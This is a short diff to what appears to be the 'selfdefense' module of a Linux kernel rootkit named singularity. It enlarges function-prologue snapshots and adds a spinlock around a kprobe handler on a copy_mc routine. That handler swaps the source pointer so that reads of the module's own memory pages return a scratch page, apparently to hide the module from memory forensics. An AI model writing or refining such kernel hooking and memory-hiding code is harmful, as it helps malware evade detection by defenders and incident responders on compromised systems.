@@ -7,7 +7,7 @@ Initial and poop version of singularity selfdefense.c module
 #include "../ftrace/ftrace_helper.h"
 #include "../include/selfdefense.h"
 
-#define PROLOGUE_SNAP  16
+#define PROLOGUE_SNAP  64
 #define MAX_SNAPS      512
 
 struct sd_snap {
@@ -374,6 +374,7 @@ static notrace bool sd_is_mod_page(unsigned long phys)
 static char sd_zero_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
 
 static char sd_scratch_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
+static DEFINE_SPINLOCK(sd_scratch_lock);
 
 #define SD_MAX_PARTIAL 256
 struct sd_partial_entry {
@@ -464,6 +465,7 @@ static int notrace sd_copy_mc_pre(struct kprobe *p, struct pt_regs *regs)
         return 0;
     }
 
+    spin_lock(&sd_scratch_lock);
     for (i = 0; i < sd_partial_count; i++) {
         if (sd_partial[i].phys != phys)
             continue;
@@ -475,6 +477,7 @@ static int notrace sd_copy_mc_pre(struct kprobe *p, struct pt_regs *regs)
     }
     if (found_partial)
         regs->si = (unsigned long)sd_scratch_page;
+    spin_unlock(&sd_scratch_lock);
 
     return 0;
 }
